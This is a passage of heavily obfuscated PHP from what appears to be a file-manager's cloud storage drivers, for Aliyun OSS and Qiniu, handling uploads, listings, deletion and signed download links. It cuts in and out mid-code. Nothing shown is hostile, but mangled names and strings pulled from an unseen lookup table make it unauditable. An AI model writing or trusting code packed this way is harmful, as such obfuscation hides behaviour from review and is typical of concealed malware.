$Ì¦ƒ‹””[4] = implode($€ŒöÅ—ô[206], $Ùç®¡é); } $³™İ¼ø² = implode($€ŒöÅ—ô[206], $Ì¦ƒ‹””); $Í¦ªÒ„ = base64_encode(hash_hmac($€ŒöÅ—ô[256], $³™İ¼ø², $this->secret, !0)); $íµ…š¤¹ = $€ŒöÅ—ô[1388] . $this->accessKey . $€ŒöÅ—ô[4] . $Í¦ªÒ„; if (strpos($óêìø³‚, $€ŒöÅ—ô[252]) === 0) { $íµ…š¤¹ = array($€ŒöÅ—ô[258] => $íµ…š¤¹, $€ŒöÅ—ô[249] => $†¤ª«õØ); if ($¨Ë¿†Ğ) { $íµ…š¤¹ = array_merge($íµ…š¤¹, $¨Ë¿†Ğ); } } return $íµ…š¤¹; } public function listUploadParts($ñöëß›Õ, $Ì¿Õ¹ŠÉ) { $í£óì¦­ =& $_SERVER[–Ú¬çÁ]; $·µ¿ş‚ = parse_url_query($Ì¿Õ¹ŠÉ[$í£óì¦­[175]]); $ŠáÍÒŠ = $this->client->listParts($this->bucket, $this->pathEncode($ñöëß›Õ), $·µ¿ş‚[$í£óì¦­[248]]); $øÍŒıâ = $ŠáÍÒŠ->getListPart(); $’‡’Çİˆ = array(); foreach ($øÍŒıâ as $Ë¥¬˜°ê) { $’‡’Çİˆ[] = array($í£óì¦­[1409] => $Ë¥¬˜°ê->getPartNumber(), $í£óì¦­[1410] => trim($Ë¥¬˜°ê->getETag(), $í£óì¦­[118])); } unset($Ì¿Õ¹ŠÉ[$í£óì¦­[250]], $Ì¿Õ¹ŠÉ[$í£óì¦­[254]]); $ß¾ú’û¦ = $this->multiUploadAuthData($ñöëß›Õ, $Ì¿Õ¹ŠÉ); if (empty($ß¾ú’û¦)) { return !1; } return array($í£óì¦­[258] => $ß¾ú’û¦, $í£óì¦­[249] => $Ì¿Õ¹ŠÉ[$í£óì¦­[249]], $í£óì¦­[260] => $’‡’Çİˆ); } public function download($òùÕò‡, $ªñÊ´°é) { if ($this->isFolder($òùÕò‡)) { return !1; } try { $‹òÁ‡¹ß = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ªñÊ´°é); $‹òÁ‡¹ß = $this->trafficLimit($_SERVER[–Ú¬çÁ][109], $‹òÁ‡¹ß); $this->client->getObject($this->bucket, $this->pathEncode($òùÕò‡), $‹òÁ‡¹ß); } catch (OSS\Core\OssException $ßÇÓé… ) { return !1; } return $ªñÊ´°é; } public function fileSubstr($›ßÓô«», $÷ø“ÙæÈ = 0, $·ÉÛˆ…Ñ = false) { if ($÷ø“ÙæÈ === -1) { $›„œ‚Ÿ¤ = array(); } else { if ($·ÉÛˆ…Ñ === !1) { $ÂÀİù¿ = $this->size($›ßÓô«»); } else { $ÂÀİù¿ = $÷ø“ÙæÈ + $·ÉÛˆ…Ñ - 1; } $›„œ‚Ÿ¤ = array(OSS\OssClient::OSS_RANGE => "{$÷ø“ÙæÈ}\x2d{$ÂÀİù¿}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($›ßÓô«»), $›„œ‚Ÿ¤); } catch (OSS\Core\OssException $÷Å½ü²) { think_exception($÷Å½ü²->getMessage()); return !1; } } private function trafficLimit($ÕÅô£´, $­úı«£‘ = array()) { $ŞÖò›„Á =& $_SERVER[–Ú¬çÁ]; if ($ÕÅô£´ == $ŞÖò›„Á[1415] && $this->isUploadServer() || $ÕÅô£´ == $ŞÖò›„Á[109] && $this->isFileOutServer()) { return $­úı«£‘; } $ßÃ¡ = floatval($GLOBALS[$ŞÖò›„Á[6]][$ŞÖò›„Á[89]][$ŞÖò›„Á[107]][$ÕÅô£´]) * 1024 * 1024 * 8; if (!$ßÃ¡) { return $­úı«£‘; } $ßÃ¡ = $ßÃ¡ < 819200 ? 819200 : ($ßÃ¡ > 838860800 ? 838860800 : $ßÃ¡); $­úı«£‘[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ßÃ¡); return $­úı«£‘; } public function link($²Éïãˆ‰, $‡«®½º = array()) { $Ôˆ¥°¬ö =& $_SERVER[–Ú¬çÁ]; if (!$this->exist($²Éïãˆ‰) || $this->isFolder($²Éïãˆ‰)) { return !1; } try { $‡«®½º = $this->trafficLimit($Ôˆ¥°¬ö[109], $‡«®½º); $âÀõáÀ— = $this->client->signUrl($this->bucket, $this->pathEncode($²Éïãˆ‰), 3600 * 12, $Ôˆ¥°¬ö[255], $‡«®½º); return $this->getCdnLink($âÀõáÀ—); } catch (OSS\Core\OssException $å“ÊÊ³Õ) { return !1; } } public function fileOut($¶¾ôèœ¤, $™´¾ı¯ = false, $Ç¹˜¶«¡ = false, $´¼±ûîº = '') { $öæ¬Å‰¡ =& $_SERVER[–Ú¬çÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶¾ôèœ¤, $™´¾ı¯, $Ç¹˜¶«¡, $´¼±ûîº); } if (!$Ç¹˜¶«¡) { $Ç¹˜¶«¡ = $this->pathThis($¶¾ôèœ¤); } $Ç¹˜¶«¡ = rawurlencode($Ç¹˜¶«¡); $ƒÅ§Ü‰ = get_file_mime(get_path_ext($Ç¹˜¶«¡)); if ($ƒÅ§Ü‰ == $öæ¬Å‰¡[242]) { return parent::fileOut($¶¾ôèœ¤, $™´¾ı¯, $Ç¹˜¶«¡, $´¼±ûîº); } $™´¾ı¯ = $™´¾ı¯ ? $öæ¬Å‰¡[1425] : $öæ¬Å‰¡[1426]; $‘ßÇ´»ì = array(OSS\OssClient::OSS_SUB_RESOURCE => $öæ¬Å‰¡[1427] . rawurlencode("{$™´¾ı¯}\x3b\x66\x69\154\145\x6e\x61\155\145\x3d{$Ç¹˜¶«¡}")); $‘ßÇ´»ì[OSS\OssClient::OSS_SUB_RESOURCE] .= $öæ¬Å‰¡[1428] . rawurlencode($ƒÅ§Ü‰); $Æ‰ÄÑ” = $this->link($¶¾ôèœ¤, $‘ßÇ´»ì); $this->fileOutLink($Æ‰ÄÑ”); } public function fileOutServer($ÇË‘±ÜØ, $„¨´ÓÖ¹ = false, $§ÓËİîã = false, $ø¾–“Ä¸ = '') { parent::fileOut($ÇË‘±ÜØ, $„¨´ÓÖ¹, $§ÓËİîã, $ø¾–“Ä¸); } public function fileOutImage($Û¿ñùõ, $“ú©•æø = 250) { if ($this->size($Û¿ñùõ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Û¿ñùõ, $“ú©•æø); } $ğ˜ß£¬– = array(OSS\OssClient::OSS_PROCESS => $_SERVER[–Ú¬çÁ][1429] . $“ú©•æø); $Ç¯©Ş”Ö = $this->link($Û¿ñùõ, $ğ˜ß£¬–); $this->fileOutLink($Ç¯©Ş”Ö); } public function fileOutImageServer($üï©ç©, $°’óµ¾ = 250) { parent::fileOutImage($üï©ç©, $°’óµ¾); } public function fileOutLink($šÛä®™¸) { $‘ü™ŞÏ¹ =& $_SERVER[–Ú¬çÁ]; if (!$this->isCdnHost() && substr($šÛä®™¸, 0, 7) == $‘ü™ŞÏ¹[1350]) { $šÛä®™¸ = $‘ü™ŞÏ¹[1351] . substr($šÛä®™¸, 7); } header($‘ü™ŞÏ¹[162] . $šÛä®™¸); die; } public function hashMd5($ÆŠî”·©, $‚¥»¬È = '') { $õ¶Ü¡’å =& $_SERVER[–Ú¬çÁ]; $Äæ¬¿Çè = $this->_objectMeta($ÆŠî”·©); if (!$Äæ¬¿Çè) { return $õ¶Ü¡’å[12]; } if (!isset($Äæ¬¿Çè[$õ¶Ü¡’å[1405]]) && !empty($‚¥»¬È)) { $„İ¼¶â‹ = $this->updateObjMeta($ÆŠî”·©, array($õ¶Ü¡’å[1405] => $‚¥»¬È)); $Äæ¬¿Çè[$õ¶Ü¡’å[1405]] = $„İ¼¶â‹ ? $‚¥»¬È : $õ¶Ü¡’å[12]; } return isset($Äæ¬¿Çè[$õ¶Ü¡’å[1405]]) ? strtolower($Äæ¬¿Çè[$õ¶Ü¡’å[1405]]) : $õ¶Ü¡’å[12]; } public function size($İºö–ôÆ) { $Ã°ŸÊ‘­ = $this->objectMeta($İºö–ôÆ); return $Ã°ŸÊ‘­ ? $Ã°ŸÊ‘­[$_SERVER[–Ú¬çÁ][76]] : 0; } public function info($ÊÅÈÙ—ß) { if ($this->isFolder($ÊÅÈÙ—ß)) { return $this->folderInfo($ÊÅÈÙ—ß); } else { if ($this->isFile($ÊÅÈÙ—ß)) { return $this->fileInfo($ÊÅÈÙ—ß); } } return !1; } public function exist($½®Ã) { return $this->isFile($½®Ã) || $this->isFolder($½®Ã); } public function isFile($Â¶”Î…) { return !$this->isFolder($Â¶”Î…) && $this->objectMeta($Â¶”Î…); } public function isFolder($ğ³ëñÑğ) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][166], $ğ³ëñÑğ); } protected function objectMeta($ÂñÊÉÒê) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][168], $ÂñÊÉÒê); } protected function _objectMeta($†…Şá ) { $Şø¯•Á½ =& $_SERVER[–Ú¬çÁ]; try { $ÜÜé“Ã = $this->client->getObjectMeta($this->bucket, $this->pathEncode($†…Şá )); } catch (OSS\Core\OssException $¦¢ÊäÕ) { $ÜÜé“Ã = !1; } if ($ÜÜé“Ã) { $ÜÜé“Ã[$Şø¯•Á½[76]] = intval($ÜÜé“Ã[$Şø¯•Á½[1403]]); } return $ÜÜé“Ã; } protected function _isFolder($¡ÛıšÇÀ) { $Ğ¹­ÏÖè =& $_SERVER[–Ú¬çÁ]; if ($¡ÛıšÇÀ == $Ğ¹­ÏÖè[12] || $¡ÛıšÇÀ == $Ğ¹­ÏÖè[8]) { return !0; } $Å‹¿‰Œ = array($Ğ¹­ÏÖè[1398] => $Ğ¹­ÏÖè[8], $Ğ¹­ÏÖè[1399] => rtrim($¡ÛıšÇÀ, $Ğ¹­ÏÖè[8]) . $Ğ¹­ÏÖè[8], $Ğ¹­ÏÖè[1400] => 1, $Ğ¹­ÏÖè[1401] => $Ğ¹­ÏÖè[12]); $ÓÎ…´Ø€ = $this->client->listObjects($this->bucket, $Å‹¿‰Œ); if ($ÓÎ…´Ø€->getObjectList() || $ÓÎ…´Ø€->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($À»†•ü) { parent::__construct(); require_once SDK_DIR . $_SERVER[–Ú¬çÁ][1430]; $this->_init($À»†•ü); } public function _init($áŸ‘öæŞ) { $åıåïÉé =& $_SERVER[–Ú¬çÁ]; $this->config = $áŸ‘öæŞ; foreach ($áŸ‘öæŞ as $”Î¡©”Î => $Ê¾»Û«) { if (isset($this->{$”Î¡©”Î})) { $this->{$”Î¡©”Î} = $Ê¾»Û«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($åıåïÉé[1431] . LNG($åıåïÉé[1389])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($’³Í“Ì¹, $„æĞÈ˜­ = '', $¸òà÷´İ = REPEAT_RENAME) { if ($this->setContent($’³Í“Ì¹, $„æĞÈ˜­)) { return $this->getPathOuter($’³Í“Ì¹); } return !1; } public function mkdir($ø‘œ•û¿, $¯ç´§óè = REPEAT_SKIP) { $€îû‹û© =& $_SERVER[–Ú¬çÁ]; $İš¾ƒ“ = trim($ø‘œ•û¿, $€îû‹û©[8]); if ($this->_isFolder($İš¾ƒ“)) { return $this->getPathOuter($İš¾ƒ“); } $ø‘œ•û¿ = $İš¾ƒ“ . $€îû‹û©[8]; $û…²„Ù— = get_path_this($İš¾ƒ“); $ıõÃùÙ™ = $ø‘œ•û¿ . $û…²„Ù—; if (!$this->mkfile($ıõÃùÙ™)) { return !1; } if (!$this->moveFile($ıõÃùÙ™, $ø‘œ•û¿)) { $this->delFile($ıõÃùÙ™); return !1; } return $this->getPathOuter($İš¾ƒ“); } public function copyFile($“ã»’Ã˜, $‰Š‘ÁÉë) { $ŒÔšòœØ = $this->bucketManager->copy($this->bucket, $“ã»’Ã˜, $this->bucket, $‰Š‘ÁÉë, !0); return $ŒÔšòœØ ? !1 : $this->getPathOuter($‰Š‘ÁÉë); } public function moveFile($ğëı•Üó, $¦Å¼ºÒ¬) { $¨–¦—ÄÆ = $this->bucketManager->move($this->bucket, $ğëı•Üó, $this->bucket, $¦Å¼ºÒ¬, !0); return $¨–¦—ÄÆ ? !1 : $this->getPathOuter($¦Å¼ºÒ¬); } public function delFile($÷Â÷ÜÅ) { if (!$this->exist($÷Â÷ÜÅ)) { return !0; } $ü’½šÚì = $this->bucketManager->delete($this->bucket, $÷Â÷ÜÅ); return $ü’½šÚì ? !1 : !0; } public function delFolder($’’¤Ş¯‰) { $‘Òò²ßŞ =& $_SERVER[–Ú¬çÁ]; if (!$this->exist($’’¤Ş¯‰)) { return !0; } $this->listItemCache = !1; $ÍˆñÆ˜İ = $this->fileList($’’¤Ş¯‰); $this->listItemCache = !0; $Ê®ÙØ§š = trim($’’¤Ş¯‰, $‘Òò²ßŞ[8]) . $‘Òò²ßŞ[8]; if (!empty($’’¤Ş¯‰) && $’’¤Ş¯‰ !== $‘Òò²ßŞ[222] && !in_array($Ê®ÙØ§š, $ÍˆñÆ˜İ[$‘Òò²ßŞ[82]])) { $ÍˆñÆ˜İ[$‘Òò²ßŞ[82]][] = $Ê®ÙØ§š; } $êï³™æí = $this->delByBatch($ÍˆñÆ˜İ[$‘Òò²ßŞ[83]]); if (!$êï³™æí) { return !1; } $êï³™æí = $this->delByBatch($ÍˆñÆ˜İ[$‘Òò²ßŞ[82]]); if (!$êï³™æí) { return !1; } return $this->delFile($Ê®ÙØ§š); } private function delByBatch($ˆ•Ø¹Ãæ) { foreach (array_chunk($ˆ•Ø¹Ãæ, 1000) as $ï”€ÒÇÀ) { $‚×ÎâëÛ = $this->bucketManager->buildBatchDelete($this->bucket, $ï”€ÒÇÀ); list($ßˆ­Òò¥, $î‘º€Â) = $this->bucketManager->batch($‚×ÎâëÛ); if ($î‘º€Â) { return !1; } } return !0; } public function rename($½ãÀ¯€§, $¡ıïÒ³ü) { return $this->renameObject($½ãÀ¯€§, $¡ıïÒ³ü); } public function fileInfo($çŸòŒô, $¦™’¨§ö = false, $à›’—÷ú = array()) { $½ç´Á¬¶ =& $_SERVER[–Ú¬çÁ]; $¾â¾ÑÖµ = array($½ç´Á¬¶[32] => $this->pathThis($çŸòŒô), $½ç´Á¬¶[84] => $this->getPathOuter($½ç´Á¬¶[8] . $çŸòŒô), $½ç´Á¬¶[33] => $½ç´Á¬¶[224], $½ç´Á¬¶[76] => isset($à›’—÷ú[$½ç´Á¬¶[1432]]) ? $à›’—÷ú[$½ç´Á¬¶[1432]] : 0, $½ç´Á¬¶[175] => $this->ext($çŸòŒô)); if ($¦™’¨§ö) { return $¾â¾ÑÖµ; } $¾â¾ÑÖµ[$½ç´Á¬¶[225]] = $¾â¾ÑÖµ[$½ç´Á¬¶[85]] = 0; $¾â¾ÑÖµ[$½ç´Á¬¶[226]] = $¾â¾ÑÖµ[$½ç´Á¬¶[227]] = !0; if (empty($à›’—÷ú)) { $à›’—÷ú = $this->objectMeta($çŸòŒô); if (!$à›’—÷ú) { return $¾â¾ÑÖµ; } } if (isset($à›’—÷ú[$½ç´Á¬¶[228]]) && $à›’—÷ú[$½ç´Á¬¶[228]]) { $¾â¾ÑÖµ[$½ç´Á¬¶[229]] = $à›’—÷ú[$½ç´Á¬¶[228]]; } if (isset($à›’—÷ú[$½ç´Á¬¶[238]]) && $à›’—÷ú[$½ç´Á¬¶[238]]) { $¾â¾ÑÖµ[$½ç´Á¬¶[229]] = $à›’—÷ú[$½ç´Á¬¶[238]]; } if (isset($à›’—÷ú[$½ç´Á¬¶[1433]])) { $¾â¾ÑÖµ[$½ç´Á¬¶[85]] = substr($à›’—÷ú[$½ç´Á¬¶[1433]] . $½ç´Á¬¶[12], 0, 10); } if (isset($à›’—÷ú[$½ç´Á¬¶[1432]])) { $¾â¾ÑÖµ[$½ç´Á¬¶[76]] = $à›’—÷ú[$½ç´Á¬¶[1432]]; } return $¾â¾ÑÖµ; } public function folderInfo($¯Í© Î‡, $³‰ŒªØ = false) { $ş×˜„İÇ =& $_SERVER[–Ú¬çÁ]; $®í¶€­Í = array($ş×˜„İÇ[32] => $this->pathThis($¯Í© Î‡), $ş×˜„İÇ[84] => $this->getPathOuter($ş×˜„İÇ[8] . $¯Í© Î‡), $ş×˜„İÇ[33] => $ş×˜„İÇ[75]); if ($³‰ŒªØ) { return $®í¶€­Í; } $®í¶€­Í[$ş×˜„İÇ[225]] = $®í¶€­Í[$ş×˜„İÇ[85]] = 0; $®í¶€­Í[$ş×˜„İÇ[226]] = $®í¶€­Í[$ş×˜„İÇ[227]] = !0; $¯Í© Î‡ = rtrim($¯Í© Î‡, $ş×˜„İÇ[8]) . $ş×˜„İÇ[8]; $£Äî–„ = $this->objectMeta($¯Í© Î‡); if (isset($£Äî–„[$ş×˜„İÇ[1433]])) { $®í¶€­Í[$ş×˜„İÇ[85]] = substr($£Äî–„[$ş×˜„İÇ[1433]] . $ş×˜„İÇ[12], 0, 10); } return $®í¶€­Í; } public function listPath($»×™™€¢, $æââ®ù÷ = false) { $áøĞù¼² =& $_SERVER[–Ú¬çÁ]; $›Âş€Éƒ = $this->fileList($»×™™€¢, $áøĞù¼²[8], !0); foreach ($›Âş€Éƒ[$áøĞù¼²[82]] as $ĞÊäÃûç => $³æÙıø) { $›Âş€Éƒ[$áøĞù¼²[82]][$ĞÊäÃûç] = $this->folderInfo($³æÙıø, $æââ®ù÷); } foreach ($›Âş€Éƒ[$áøĞù¼²[83]] as $ĞÊäÃûç => $³æÙıø) { $›Âş€Éƒ[$áøĞù¼²[83]][$ĞÊäÃûç] = $this->fileInfo($³æÙıø[$áøĞù¼²[94]], $æââ®ù÷, $³æÙıø); } return $›Âş€Éƒ; } public function has($óÛî÷Œ¸, $‘¨•Òªş = false, $·¡ùÕŠ = true) { $•Îµ–”´ =& $_SERVER[–Ú¬çÁ]; $óÛî÷Œ¸ = trim($óÛî÷Œ¸, $•Îµ–”´[8]); $„øöµ¥ß = empty($óÛî÷Œ¸) && $óÛî÷Œ¸ !== $•Îµ–”´[222] ? $•Îµ–”´[12] : $óÛî÷Œ¸ . $•Îµ–”´[8]; $½©‚Ì¾Ë = $•Îµ–”´[12]; $ëĞ­™ãÈ = 500; $õÌ˜ŸùÑ = $•Îµ–”´[8]; $æº›ûÃÇ = $ıÎúÅ²× = 0; while (!0) { check_abort(); list($‹ç™‘’, $™€„ù­ë) = $this->bucketManager->listFiles($this->bucket, $„øöµ¥ß, $½©‚Ì¾Ë, $ëĞ­™ãÈ, $õÌ˜ŸùÑ); if ($™€„ù­ë) { break; } $½©‚Ì¾Ë = array_key_exists($•Îµ–”´[1401], $‹ç™‘’) ? $½©‚Ì¾Ë = $‹ç™‘’[$•Îµ–”´[1434]] : $•Îµ–”´[12]; if ($‘¨•Òªş) { if (!empty($‹ç™‘’[$•Îµ–”´[1435]])) { $æº›ûÃÇ += count($‹ç™‘’[$•Îµ–”´[1435]]); } if (!empty($‹ç™‘’[$•Îµ–”´[1436]])) { $ıÎúÅ²× += count($‹ç™‘’[$•Îµ–”´[1436]]); } if ($½©‚Ì¾Ë === $•Îµ–”´[12]) { break; } continue; } if ($·¡ùÕŠ) { if (!empty($‹ç™‘’[$•Îµ–”´[1435]])) { return !0; } } else { if (!empty($‹ç™‘’[$•Îµ–”´[1436]])) { return !0; } } if ($½©‚Ì¾Ë === $•Îµ–”´[12]) { break; } } if ($‘¨•Òªş) { return array($•Îµ–”´[233] => $æº›ûÃÇ, $•Îµ–”´[234] => $ıÎúÅ²×); } return !1; } public function listAll($Äá«ØÜõ) { $éº¿Œ“š =& $_SERVER[–Ú¬çÁ]; $¼Ìœ—‘› = $this->fileList($Äá«ØÜõ, $éº¿Œ“š[12], !0); $è¿Ğ¾íë = array_to_keyvalue($¼Ìœ—‘›[$éº¿Œ“š[83]], $éº¿Œ“š[32]); foreach ($¼Ìœ—‘›[$éº¿Œ“š[82]] as $³Íµ‰Ñì) { if (is_string($³Íµ‰Ñì)) { $è¿Ğ¾íë[$³Íµ‰Ñì] = array($éº¿Œ“š[76] => 0); } } return $this->listAllFiles($Äá«ØÜõ, $è¿Ğ¾íë); } private function fileList($±×·ÈÁŞ, $şÜ•©æ¹ = '', $£ôäíî… = 0) { $‘¡•à—í =& $_SERVER[–Ú¬çÁ]; $±×·ÈÁŞ = trim($±×·ÈÁŞ, $‘¡•à—í[8]); $ìï¼§ñØ = empty($±×·ÈÁŞ) && $±×·ÈÁŞ !== $‘¡•à—í[222] ? $‘¡•à—í[12] : $±×·ÈÁŞ . $‘¡•à—í[8]; $Ü«Ó¼’¤ = $‘¡•à—í[12]; $Ş×Á‘…º = 1000; $¥ó½éö¨ = $¨«Şè”– = array(); while (!0) { check_abort(); list($û©˜Ïì¬, $¿Â™İÌô) = $this->bucketManager->listFiles($this->bucket, $ìï¼§ñØ, $Ü«Ó¼’¤, $Ş×Á‘…º, $şÜ•©æ¹); if ($¿Â™İÌô) { break; } $Ü«Ó¼’¤ = array_key_exists($‘¡•à—í[1401], $û©˜Ïì¬) ? $Ü«Ó¼’¤ = $û©˜Ïì¬[$‘¡•à—í[1434]] : $‘¡•à—í[12]; $õğ‰„  = isset($û©˜Ïì¬[$‘¡•à—í[1435]]) ? $û©˜Ïì¬[$‘¡•à—í[1435]] : array(); $ƒÌÒª‘ = isset($û©˜Ïì¬[$‘¡•à—í[1436]]) ? $û©˜Ïì¬[$‘¡•à—í[1436]] : array(); foreach ($õğ‰„  as $€•ËşÒ) { if ($€•ËşÒ[$‘¡•à—í[94]] == $ìï¼§ñØ) { continue; } $ñ³½½°Õ = $€•ËşÒ[$‘¡•à—í[94]]; $çĞ­áš• = $€•ËşÒ[$‘¡•à—í[1432]]; $€•ËşÒ[$‘¡•à—í[76]] = $çĞ­áš•; $š÷ë×ÕĞ = $çĞ­áš• == 0 && substr($ñ³½½°Õ, strlen($ñ³½½°Õ) - 1, 1) == $‘¡•à—í[8] ? !0 : !1; $this->cacheMethodInfoSet($ñ³½½°Õ, $š÷ë×ÕĞ, $€•ËşÒ); if ($š÷ë×ÕĞ) { $¥ó½éö¨[] = $ñ³½½°Õ; continue; } $¨«Şè”–[] = $£ôäíî… ? $€•ËşÒ : $ñ³½½°Õ; } foreach ($ƒÌÒª‘ as $ñ³½½°Õ) { if ($ñ³½½°Õ == $ìï¼§ñØ) { continue; } $¥ó½éö¨[] = $ñ³½½°Õ; $this->cacheMethodInfoSet($ñ³½½°Õ, !0); } if ($Ü«Ó¼’¤ === $‘¡•à—í[12]) { break; } } $this->cacheMethodInfoSet($±×·ÈÁŞ, !0); return array($‘¡•à—í[82] => $¥ó½éö¨, $‘¡•à—í[83] => $¨«Şè”–); } public function canRead($Üõ±´Â) { return $this->exist($Üõ±´Â) ? !0 : !1; } public function canWrite($¦şü¹ÒÜ) { return $this->exist($¦şü¹ÒÜ) ? !0 : !1; } public function getContent($îŠÅŒôğ) { return $this->fileSubstr($îŠÅŒôğ, 0, -1); } public function setContent($Äõ™Öµ, $ô¹ò°â¾ = '') { $ÍèßÌİ‘ = $this->tempFile($this->pathThis($Äõ™Öµ)); file_put_contents($ÍèßÌİ‘, $ô¹ò°â¾); if ($this->upload($Äõ™Öµ, $ÍèßÌİ‘)) { $this->tempFileRemve($ÍèßÌİ‘); return !0; } return !1; } public function refreshUrls($ûæƒõÕº) { $œò¶§Ç =& $_SERVER[–Ú¬çÁ]; $”ø®àš” = array(); if (is_array($ûæƒõÕº)) { foreach ($ûæƒõÕº as $‚ò²™•Ê) { $”ø®àš”[] = $this->link($‚ò²™•Ê); } } else { $”ø®àš”[] = $this->link($ûæƒõÕº); } $ûİ£Ê·ë = new Qiniu\Cdn\CdnManager($this->auth); list($ëá›½ë«, $Ô¹˜·Æß) = $ûİ£Ê·ë->refreshUrls($”ø®àš”); if ($Ô¹˜·Æß) { return !1; } return $ëá›½ë«[$œò¶§Ç[1202]] == $œò¶§Ç[779] ? !0 : !1; } public function fileSubstr($Æºáüæ, $Â–ÍÎüş, $Öçç™ç) { $è£³ÃÉ‹ =& $_SERVER[–Ú¬çÁ]; if (!($•¼±Îû = $this->link($Æºáüæ))) { return !1; } $ª´¯ğºã = !1; if ($Öçç™ç > 0) { $°•Ú„ã€ = $Â–ÍÎüş + $Öçç™ç - 1; $ª´¯ğºã = array($è£³ÃÉ‹[1437] . $Â–ÍÎüş . $è£³ÃÉ‹[439] . $°•Ú„ã€); } $‹éÍõ°ß = url_request($•¼±Îû, $è£³ÃÉ‹[255], !1, $ª´¯ğºã); return $‹éÍõ°ß[$è£³ÃÉ‹[770]] ? $‹éÍõ°ß[$è£³ÃÉ‹[1222]] : !1; } public function upload($á®ıˆ, $¹ú‘ÙĞÒ, $½ñÆò… = false, $éºÄ¡ » = REPEAT_REPLACE) { $âĞ­è = new Qiniu\Storage\UploadManager(); $’¦ó«Ÿ = $this->auth->uploadToken($this->bucket, $á®ıˆ); $ºÊÀÂş = get_file_mime(get_path_ext($¹ú‘ÙĞÒ)); list($é¤ß‡Ù–, $¬¡äå—¿) = $âĞ­è->putFile($’¦ó«Ÿ, $á®ıˆ, $¹ú‘ÙĞÒ, null, $ºÊÀÂş); return $¬¡äå—¿ ? !1 : $this->getPathOuter($á®ıˆ); } public function uploadFormData($ØÒá÷È², $£‰À£Ùœ = 3600) { return $this->uploadToken($ØÒá÷È², $£‰À£Ùœ); } public function multiUploadFormData($†õ¾®øÓ, $éÛşì¾• = 3600) { return $this->uploadToken($†õ¾®øÓ, $éÛşì¾•); } private function uploadToken($¶£¸¯À, $‹«ô¿ĞÒ = 3600) { $Ãïµ«ÒÚ =& $_SERVER[–Ú¬çÁ]; $óŸ’šéÂ = $‹«ô¿ĞÒ; $ùŠÂªÚ = array($Ãïµ«ÒÚ[1438] => $Ãïµ«ÒÚ[1439]); $Ì˜¾Õ¨ = $¶£¸¯À; $ñ–µèÉ¿ = $this->auth->uploadToken($this->bucket, $Ì˜¾Õ¨, $óŸ’šéÂ, $ùŠÂªÚ, !0); $Çİ×³– = empty($this->region) || $this->region == $Ãïµ«ÒÚ[1440] ? $Ãïµ«ÒÚ[12] : $Ãïµ«ÒÚ[439] . $this->region; $…ç¦ş’´ = http_type() . "\x3a\57\x2f\x75\x70\x6c\157\x61\144{$Çİ×³–}\56\x71\151\x6e\x69\165\x70\56\x63\157\155\x2f"; return array($Ãïµ«ÒÚ[1441] => $ñ–µèÉ¿, $Ãïµ«ÒÚ[1442] => $…ç¦ş’´); } public function download($úøÅ¶Ü, $¤¡ò²Ü¥) { $Å®üÊ¨ = IO::getPathInner(IO::mkfile($¤¡ò²Ü¥)); if (!($²şõ¯â = $this->link($úøÅ¶Ü))) { return !1; } $¾¢ã°òÑ = 0; $ĞÁ“·‹¦ = 1024 * 200; $Ø¦‡ñÒª = fopen($Å®üÊ¨, $_SERVER[–Ú¬çÁ][1443]); while (!0) { $šŸÙ¾ÙÂ = $this->fileSubstr($úøÅ¶Ü, $¾¢ã°òÑ, $ĞÁ“·‹¦); if ($šŸÙ¾ÙÂ === !1) { return !1; } fwrite($Ø¦‡ñÒª, $šŸÙ¾ÙÂ); $¾¢ã°òÑ += $ĞÁ“·‹¦; if (strlen($šŸÙ¾ÙÂ) < $ĞÁ“·‹¦) { break; } } fclose($Ø¦‡ñÒª); return $¤¡ò²Ü¥; } public function link($ã¯ò²é·, $åÔ¸üÍ¢ = '') { if (!$this->isFile($ã¯ò²é·)) { return !1; } $¸á’ë Æ = $this->getHost() . $_SERVER[–Ú¬çÁ][8] . $this->pathEncode($ã¯ò²é·) . $åÔ¸üÍ¢; return $this->auth->privateDownloadUrl($¸á’ë Æ, 3600 * 12); } public function fileOut($ç¶«òãŒ, $ÜíÅ™Ö‘ = false, $›—¯İèÑ = false, $¥»Ÿ‚à = '') { $³Ò…ÅÇÚ =& $_SERVER[–Ú¬çÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ç¶«òãŒ, $ÜíÅ™Ö‘, $›—¯İèÑ, $¥»Ÿ‚à); } if (!$›—¯İèÑ) { $›—¯İèÑ = $this->pathThis($ç¶«òãŒ); } $ôøÓ¤¼ = $ÜíÅ™Ö‘ ? $³Ò…ÅÇÚ[1444] . rawurlencode($›—¯İèÑ) : $³Ò…ÅÇÚ[12]; $îƒàÁ€” = $this->link($ç¶«òãŒ, $ôøÓ¤¼); $this->fileOutLink($îƒàÁ€”); } public function fileOutServer($‰è°ÍÎ, $›œ…é˜‰ = false, $ñŠ“›ä = false, $¸×Ç´˜ = '') { parent::fileOut($‰è°ÍÎ, $›œ…é˜‰, $ñŠ“›ä, $¸×Ç´˜); } public function fileOutImage($ú§Ú, $²…«¾‰ = 250) { $ğ¾öä½Ì = $this->link($ú§Ú, $_SERVER[–Ú¬çÁ][1445] . $²…«¾‰); $this->fileOutLink($ğ¾öä½Ì); } public function fileOutImageServer($È‚º™ª, $Âë†Ÿ§ = 250) { parent::fileOutImage($È‚º™ª, $Âë†Ÿ§); } public function hashMd5($İ‹‹°¸) { $ÕŸ©¢–Œ =& $_SERVER[–Ú¬çÁ]; $ÓšÇ­»ü = $this->objectMeta($İ‹‹°¸); return isset($ÓšÇ­»ü[$ÕŸ©¢–Œ[238]]) ? 